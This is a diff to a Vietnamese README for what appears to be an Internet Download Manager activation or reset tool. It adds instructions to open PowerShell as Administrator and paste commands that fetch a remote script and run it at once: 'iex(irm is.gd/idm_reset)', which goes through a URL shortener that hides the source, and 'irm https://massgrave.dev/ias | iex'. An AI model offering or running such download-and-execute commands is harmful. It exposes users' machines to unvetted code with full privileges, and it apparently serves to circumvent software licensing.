@@ -18,6 +18,17 @@ QR ngân hàng nếu quí khách có lòng hảo tâm, ủng hộ người soạ
   ```php
   powershell iex (irm https://massgrave.dev/ias)
   ```
+
+- Hoặc bạn chạy **Windows PowerShell** bằng quyền **Run as Administrator** rồi dán một trong các câu lệnh sau vào:
+
+  ```php
+  iex(irm is.gd/idm_reset)
+  ```
+
+  ```php
+  irm https://massgrave.dev/ias | iex
+  ```
+
 ## Ảnh Demo
 
   ![image](https://github.com/user-attachments/assets/f1210d0a-4b8c-4bb2-a37a-80241ba65ed0)
